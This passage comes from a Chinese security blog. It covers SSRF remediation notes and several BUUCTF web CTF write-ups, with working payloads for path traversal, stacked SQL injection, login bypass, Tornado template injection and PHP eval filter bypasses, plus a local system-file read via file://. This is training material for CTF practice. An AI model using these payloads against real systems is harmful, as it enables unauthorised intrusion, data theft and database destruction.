<p>访问ssrf.php?url=file:///c:/Windows/win.ini即可读取本地文件。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200503155448181.png" alt="image-20200503155448181"></p>
<h5 id="SSRF漏洞代码分析"><a href="#SSRF漏洞代码分析" class="headerlink" title="SSRF漏洞代码分析"></a>SSRF漏洞代码分析</h5><p>​        在页面SSRF.php中，程序获取GET参数URL，通过curl_init()初始化curl组件后，将参数URL带入curl_setopt（$ch,CURLOPT_URL，$url），然后调用所以curl-exec请求该URL。由于服务端会将banner信息返回客户端，所以可以根据banner判断主机是否存在某些服务。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200503155657246.png" alt="image-20200503155657246"></p>
<h5 id="SSRF漏洞修复建议"><a href="#SSRF漏洞修复建议" class="headerlink" title="SSRF漏洞修复建议"></a>SSRF漏洞修复建议</h5><p>针对SSRF漏洞修复，有以下几点</p>
<ul>
<li>限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS请求。</li>
<li>限制不能访问内网的IP，以防止对内网进行攻击。</li>
<li>屏蔽返回的详细信息。</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>BUUCTF题</title>
    <url>/2020/07/25/BUUCTF%E9%A2%98/</url>
    <content><![CDATA[<h3 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h3><p>打开页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616113206180.png" alt="image-20200616113206180"></p>
<p>查看源码看看</p>
<p>访问这个文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616113313805.png" alt="image-20200616113313805"></p>
<p>查看源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616113412110.png" alt="image-20200616113412110"></p>
<p>而且观察顶部代码发现有一个hint.php的文件，查看一下</p>
<p>告诉我们flag在ffffllllaaaagggg中。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616114219183.png" alt="image-20200616114219183"></p>
<p> 回到source.php代码<br> 首先看下面部分:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 字符不能为空</span><br><span class="line">if (! empty($_REQUEST[&#39;file&#39;])</span><br><span class="line"># 提交变成字符串形式</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])</span><br><span class="line"># 通过checkFile校验</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#39;file&#39;];	# 包含$_REQUEST[&#39;file&#39;]文件</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    # 打印滑稽表情</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>if语句传入file变量满足三个条件</p>
<ul>
<li>非空</li>
<li>类型为字符串</li>
<li>能够通过checkFile()函数校验</li>
</ul>
<p>只有同时满足这三个条件才能打印file中的文件，否则打印滑稽表情</p>
<p>查看checkFile()函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 高光显示</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"># 定义一个emmm的类</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line"># 将传入的参数赋值给$page</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">        # 声明$whitelist白名单数组</span><br><span class="line">            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];	</span><br><span class="line">            </span><br><span class="line">        # 若$page不存在或者不是字符串    </span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">        # 打印you can&#39;t see it</span><br><span class="line">                echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">		# 判断变量$page存在$whitelist数组中</span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">        # 返回true</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">		# 截取$page中&#39;?&#39;前部分，若无则取整个$page</span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">        # 判断截取完的$page是否在在白名单中</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        # 在返回true</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">		# url解码</span><br><span class="line">            $_page &#x3D; urldecode($page);</span><br><span class="line">            </span><br><span class="line">        # 在进行截取......</span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">        # 判断截取完的$page是否在在白名单中</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        # 在返回true</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        # 否则返回false</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到函数代码中有四个if语句</p>
<ul>
<li>第一个if语句对变量进行检验，要求$page为字符串，否则返回false</li>
<li>第二个if语句判断$page是否存在于$whitelist数组中，存在则返回true</li>
<li>第三个if语句判断截取后的$page是否存在于$whitelist数组中，截取$page中’?’前部分，存在则返回true</li>
<li>第四个if语句判断url解码并截取后的$page是否存在于$whitelist中，存在则返回true<br> 若以上四个if语句均未返回值，则返回false</li>
</ul>
<p>有三个if语句可以返回true，第二个语句直接判断$page，不可用<br> 第三个语句截取’?’前部分，由于?被后部分被解析为get方式提交的参数，也不可利用<br> 第四个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为’?’，仍可通过第四个if语句校验。（’?’两次编码值为’%253f’）,构造url：</p>
<p><code>http://***:***/source.php/%253f../ffffllllaaaagggg</code></p>
<p>无返回值，由于我们不知道ffffllllaaaagggg文件的具体位置，只能依次增加../，最终在</p>
<p><code>http://***:***/source.php/%253f../../../../../ffffllllaaaagggg</code>成功回显flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616140331329.png" alt="image-20200616140331329"></p>
<h3 id="强网杯-2019-随便注1"><a href="#强网杯-2019-随便注1" class="headerlink" title="[强网杯 2019]随便注1"></a>[强网杯 2019]随便注1</h3><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>堆叠注入为攻击者提供了很多控制权，与仅限于SELECT语句的UNION联合查询攻击不同，<strong>堆叠注入可以用于执行任何SQL语句。</strong></p>
<h4 id="堆叠原理"><a href="#堆叠原理" class="headerlink" title="堆叠原理"></a>堆叠原理</h4><p>在sql中，分号表示一条语句的结束。如果在分号的后面再加一条语句，这条语句也可以被执行，继续加一个分号和一条语句，这样就可以在一次数据库的调用中执行多个语句。</p>
<h4 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h4><p>执行查询时，第一个语句执行信息查询，第二个语句则将表user的所有内容给删除了。</p>
<p><code>mysql&gt; select * from users where id =1;delete from users;</code></p>
<p>查看页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616155324366.png" alt="image-20200616155324366"></p>
<p>使用 or 可以把表中所有数据都查询出来，但是并没有我们需要的flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616155437231.png" alt="image-20200616155437231"></p>
<p>使用order by查看字段数，当order by 2的时候返回正常，order by 3就出错了，只有两个字段，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616155537988.png" alt="image-20200616155537988"></p>
<p>这时候用union select进行联合查询，返回一个正则过滤规则，可以看到几乎所有的字段都过滤了，所以这里用堆叠注入。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616155639126.png" alt="image-20200616155639126"></p>
<p>查看当前数据库，可以看到成功了，存在堆叠注入，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show databases;#</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616155743896.png" alt="image-20200616155743896"></p>
<p>我们在用show tables来查询一下能不能查出表，有两张表，分别看看两张表有什么字段</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616155845687.png" alt="image-20200616155845687"></p>
<p>使用一下命令来查看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&#39;;show columns from &#96;words&#96; ;#</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616160014968.png" alt="image-20200616160014968"></p>
<p>并没有flag，查看另一张表，可以看到有flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0’; show columns from &#96;1919810931114514&#96;;#</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616160051149.png" alt="image-20200616160051149"></p>
<p>注意：在windows系统下，反单引号(`)是数据库、表、索引、列和别名用的引用符</p>
<p>如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM &#96;table&#96; WHERE &#96;id&#96; &#x3D; &#39;123&#39; ;</span><br></pre></td></tr></table></figure>

<p>其中1919810931114514必须用反单引号括起来，但是words不需要，应该是和数据类型有关。</p>
<p>查看一下words表结构，发现有id和data两个字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;desc words;#</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616164158609.png" alt="image-20200616164158609"></p>
<p>因为这里有两张表，会县内容肯定是从word这张表中回显的，那我们怎么才能让它回显flag所在的表呢</p>
<p>内部查询语句类似 : select id, data from word where id =</p>
<p>因为可以堆叠查询，这时候就想到了一个改名的方法，把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id，结合上面的1’ or 1=1#爆出表所有内容就可以查flag</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;rename table &#96;words&#96; to words1;rename table &#96;1919810931114514&#96; to words;alter table words change flag id varchar(100);show table;#</span><br></pre></td></tr></table></figure>

<h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p>打开界面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616230414826.png" alt="image-20200616230414826"></p>
<p>试了一下有三种显示</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616230527277.png" alt="image-20200616230527277"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616230539819.png" alt="image-20200616230539819"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616230544576.png" alt="image-20200616230544576"></p>
<p>一共有以上三种显示</p>
<p>可以使用堆叠注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1;show databases;</span><br><span class="line">1;show tables;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616230851120.png" alt="image-20200616230851120"></p>
<p>可以看到有一个Flag表，测试发现from flag都被过滤不能直接读到flag。<br>想了很久想不到 看别人wp了~，听说比赛的时候原理泄漏了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1;select $_GET[&#39;query&#39;] || flag from flag</span><br></pre></td></tr></table></figure>

<p>这tm根本想不到</p>
<p>不过由于没有过滤 * 出现了一个意外解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616231105904.png" alt="image-20200616231105904"></p>
<h3 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h3><p>查看页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617090723586.png" alt="image-20200617090723586"></p>
<p>因为题目说用SQL注入，所以就可以明确了。</p>
<p>按照正常流程来一波，先在用户名处随便输入内容，加上一个单引号( ‘ )</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617090900746.png" alt="image-20200617090900746"></p>
<p>登录，报错了，说明可以注入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617090919670.png" alt="image-20200617090919670"></p>
<p>返回，在引号后面加一个井号（#），页面返回正确</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617090958992.png" alt="image-20200617090958992"></p>
<p>使用<code>order by</code> 查看字段数，这里当<code>order by 3</code>的时候页面返回正常，其他发返回错误</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617091135646.png" alt="image-20200617091135646"></p>
<p>使用<code>union select 1,2,3#</code>来查看注入点</p>
<p>没想到flag直接出来了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617091234044.png" alt="image-20200617091234044"></p>
<h4 id="还有一种方法"><a href="#还有一种方法" class="headerlink" title="还有一种方法"></a>还有一种方法</h4><p>使用万能密码登录</p>
<p>前面的123不一定非得是123，自己喜欢输入什么就输入什么</p>
<p><code>123&#39; or &#39;1&#39;=&#39;1</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617091425914.png" alt="image-20200617091425914"></p>
<p>也是成功的返回了flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617091416354.png" alt="image-20200617091416354"></p>
<h3 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h3><p>打开网址</p>
<p>有三个文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617095216591.png" alt="image-20200617095216591"></p>
<p>挨个打开</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;***&#x2F;file?filename&#x3D;&#x2F;flag.txt&amp;filehash&#x3D;5b43f104291dd7435e0dcd18c4ed9d8a</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617103924552.png" alt="image-20200617103924552"></p>
<p>URL：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;***&#x2F;file?filename&#x3D;&#x2F;welcome.txt&amp;filehash&#x3D;67ac43a877052aa89c40b36ec5bc157e</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617103941403.png" alt="image-20200617103941403"></p>
<p>URL：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;***&#x2F;file?filename&#x3D;&#x2F;hints.txt&amp;filehash&#x3D;04b56c16ce59e7b360eed3e1638e142c</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617103948371.png" alt="image-20200617103948371"></p>
<p>有这三个内容，</p>
<p>发现render函数：将文件内容显示在网页上  <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Fqq78827534%2Farticle%2Fdetails%2F80792514" target="_blank" rel="noopener">render函数介绍</a></p>
<p>测试之后发现还有一个error界面。格式为<code>/error?msg=error</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617104507291.png" alt="image-20200617104507291"></p>
<p>联想render函数，修改msg的参数</p>
<p>因为可以看到，nsg很后面跟着Error，也跟着打印出来了，尝试一下将其改为1，或者其他，看看能否打印</p>
<p>打印了。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617104841639.png" alt="image-20200617104841639"></p>
<p>尝试一下能否进行运算，</p>
<p>传递error?msg=2，页面输出2</p>
<p>传递error?msg=4，页面输出ORZ（除和减操作符也是返回ORZ，说明操作符被过滤了）。</p>
<p>仿照url格式，我们还需要知道filehash值，filehash是一个md5后的值，联想第三个界面</p>
<p>md5(cookie_secret+md5(filename))，我们还需要知道cookie_secret，那么tornado中的cookie通过模板注入要怎么拿到呢？<br>用的就是handler.settings对象</p>
<p>其中cookie_secret是在Tornado框架的附属文件handler.settings中</p>
<p>这样就可以构造URL：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617105527432.png" alt="image-20200617105527432"></p>
<p>复制这个cookue_secret，这样我们需要写一个PHP或者python都行，来计算filehash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$cookie&#x3D;&#39;448b372f-9031-488e-83f3-35ce014c3baa&#39;;</span><br><span class="line">	$flag&#x3D;&#39;&#x2F;fllllllllllllag&#39;;</span><br><span class="line">	echo md5($cookie.md5($flag));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617105952296.png" alt="image-20200617105952296"></p>
<p>复制输出的MD5值</p>
<p>在URL中添加</p>
<p>将filename改为/fllllllllllllag，filehash改为输出的MD5值</p>
<p>Payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;***&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;2b0f561c7b112c2c8b665bfb2048405b</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617110059578.png" alt="image-20200617110059578"></p>
<h3 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h3><p>查看页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617121622838.png" alt="image-20200617121622838"></p>
<p>按F12查看一下源码</p>
<p>这里注释了一段代码，意思就是当cat等于dog时候输出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617121702435.png" alt="image-20200617121702435"></p>
<p>这里我们查看在url中构造一下，成功返回了flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617121751729.png" alt="image-20200617121751729"></p>
<h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><p>看一下源码</p>
<p>这里面有一个calc.php，访问一下试试</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617142755512.png" alt="image-20200617142755512"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"># 判断是否为空</span><br><span class="line">if(!isset($_GET[&#39;num&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line"># 不为空执行以下代码</span><br><span class="line">        $str &#x3D; $_GET[&#39;num&#39;];</span><br><span class="line"># 黑名单</span><br><span class="line">        $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];</span><br><span class="line">        </span><br><span class="line"># 遍历数组</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line"># 正则表达式对字符串进行搜索</span><br><span class="line">                if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $str)) &#123;</span><br><span class="line">            # 成功执行die</span><br><span class="line">                        die(&quot;what are you want to do?&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">       # 否则 输出str变量</span><br><span class="line">        eval(&#39;echo &#39;.$str.&#39;;&#39;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>扫一下根目录，发现有一个flagg文件</p>
<p>这里? num 中间要空格开，不能连起来写。</p>
<p><strong>解析：</strong>假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">? num&#x3D;1;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617150348928.png" alt="image-20200617150348928"></p>
<p>查看flagg</p>
<p>解析：因为直接输入/flagg是不行的，所以转成ascii码</p>
<p>成功返回flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">? num&#x3D;1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617150801953.png" alt="image-20200617150801953"></p>
<h3 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h3><p>查看页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155127550.png" alt="image-20200617155127550"></p>
<p>右上角有一个选择框查看内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155219302.png" alt="image-20200617155219302"></p>
<p>有一个登录和注册</p>
<p>随便注册一个登录试试</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155250871.png" alt="image-20200617155250871"></p>
<p>发现登录上去后有post、change password、logout功能。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155323634.png" alt="image-20200617155323634"></p>
<p>然后在index页面源码发现提示，<code>you are not admin</code>，估计题目是让我们登录成admin，然后出flag，于是想到change password功能，可能可以通过改密码功能的漏洞改掉admin密码，然后以admin登录。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155413109.png" alt="image-20200617155413109"></p>
<p>点击change password，于是跳到change password页面，看看有没有进一步的发现，也是在网页源代码处发现了提示，这个提示直接把网站项目的github地址给了出来。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155536349.png" alt="image-20200617155536349"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155654022.png" alt="image-20200617155654022"></p>
<p>复制网址打开看看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617161654507.png" alt="image-20200617161654507"></p>
<p>是一个flask项目，那就直接先奔路由去看一下，打开route.py，看一下index的注册函数代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">@app.route(&#39;&#x2F;index&#39;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#39;index.html&#39;, title &#x3D; &#39;hctf&#39;)</span><br></pre></td></tr></table></figure>

<p>发现index注册函数没做什么处理，直接返回index.html渲染模版，于是我们看一下templates/index.html代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% include(&#39;header.html&#39;) %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated %&#125;</span><br><span class="line">&lt;h1 class&#x3D;&quot;nav&quot;&gt;Hello &#123;&#123; session[&#39;name&#39;] &#125;&#125;&lt;&#x2F;h1&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated and session[&#39;name&#39;] &#x3D;&#x3D; &#39;admin&#39; %&#125;</span><br><span class="line">&lt;h1 class&#x3D;&quot;nav&quot;&gt;hctf&#123;xxxxxxxxx&#125;&lt;&#x2F;h1&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&lt;!-- you are not admin --&gt;</span><br><span class="line">&lt;h1 class&#x3D;&quot;nav&quot;&gt;Welcome to hctf&lt;&#x2F;h1&gt;</span><br><span class="line"></span><br><span class="line">&#123;% include(&#39;footer.html&#39;) %&#125;</span><br></pre></td></tr></table></figure>

<p>发现真的是要登录成admin才能得到flag。于是继续看向route.py文件，看看login和change password的注册函数处理代码是怎么写的。route.py部分函数代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;register&#39;, methods &#x3D; [&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">def register():</span><br><span class="line"></span><br><span class="line">    if current_user.is_authenticated:</span><br><span class="line">        return redirect(url_for(&#39;index&#39;))</span><br><span class="line"></span><br><span class="line">    form &#x3D; RegisterForm()</span><br><span class="line">    if request.method &#x3D;&#x3D; &#39;POST&#39;:</span><br><span class="line">        name &#x3D; strlower(form.username.data)</span><br><span class="line">        if session.get(&#39;image&#39;).lower() !&#x3D; form.verify_code.data.lower():</span><br><span class="line">            flash(&#39;Wrong verify code.&#39;)</span><br><span class="line">            return render_template(&#39;register.html&#39;, title &#x3D; &#39;register&#39;, form&#x3D;form)</span><br><span class="line">        if User.query.filter_by(username &#x3D; name).first():</span><br><span class="line">            flash(&#39;The username has been registered&#39;)</span><br><span class="line">            return redirect(url_for(&#39;register&#39;))</span><br><span class="line">        user &#x3D; User(username&#x3D;name)</span><br><span class="line">        user.set_password(form.password.data)</span><br><span class="line">        db.session.add(user)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(&#39;register successful&#39;)</span><br><span class="line">        return redirect(url_for(&#39;login&#39;))</span><br><span class="line">    return render_template(&#39;register.html&#39;, title &#x3D; &#39;register&#39;, form &#x3D; form)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;login&#39;, methods &#x3D; [&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">def login():</span><br><span class="line">    if current_user.is_authenticated:</span><br><span class="line">        return redirect(url_for(&#39;index&#39;))</span><br><span class="line"></span><br><span class="line">    form &#x3D; LoginForm()</span><br><span class="line">    if request.method &#x3D;&#x3D; &#39;POST&#39;:</span><br><span class="line">        name &#x3D; strlower(form.username.data)</span><br><span class="line">        session[&#39;name&#39;] &#x3D; name</span><br><span class="line">        user &#x3D; User.query.filter_by(username&#x3D;name).first()</span><br><span class="line">        if user is None or not user.check_password(form.password.data):</span><br><span class="line">            flash(&#39;Invalid username or password&#39;)</span><br><span class="line">            return redirect(url_for(&#39;login&#39;))</span><br><span class="line">        login_user(user, remember&#x3D;form.remember_me.data)</span><br><span class="line">        return redirect(url_for(&#39;index&#39;))</span><br><span class="line">    return render_template(&#39;login.html&#39;, title &#x3D; &#39;login&#39;, form &#x3D; form)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;logout&#39;)</span><br><span class="line">def logout():</span><br><span class="line">    logout_user()</span><br><span class="line">    return redirect(&#39;&#x2F;index&#39;)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;change&#39;, methods &#x3D; [&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">def change():</span><br><span class="line">    if not current_user.is_authenticated:</span><br><span class="line">        return redirect(url_for(&#39;login&#39;))</span><br><span class="line">    form &#x3D; NewpasswordForm()</span><br><span class="line">    if request.method &#x3D;&#x3D; &#39;POST&#39;:</span><br><span class="line">        name &#x3D; strlower(session[&#39;name&#39;])</span><br><span class="line">        user &#x3D; User.query.filter_by(username&#x3D;name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(&#39;change successful&#39;)</span><br><span class="line">        return redirect(url_for(&#39;index&#39;))</span><br><span class="line">    return render_template(&#39;change.html&#39;, title &#x3D; &#39;change&#39;, form &#x3D; form)</span><br></pre></td></tr></table></figure>

<p>这里面有三个解</p>
<p>直说其中一个，也是最简单的</p>
<h5 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h5><p>这个解法好像才是这个题目想要考查的点，我们可以发现，不管是login、register还是change页面，只要是关于session[‘name’]的操作，都先用了strlower函数将name转成小写，但是python中有自带的转小写函数<code>lower</code>，这里重写了一个，可能有点猫腻，于是找到strlower函数的定义</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def strlower(username):</span><br><span class="line">    username &#x3D; nodeprep.prepare(username)</span><br><span class="line">    return username</span><br></pre></td></tr></table></figure>

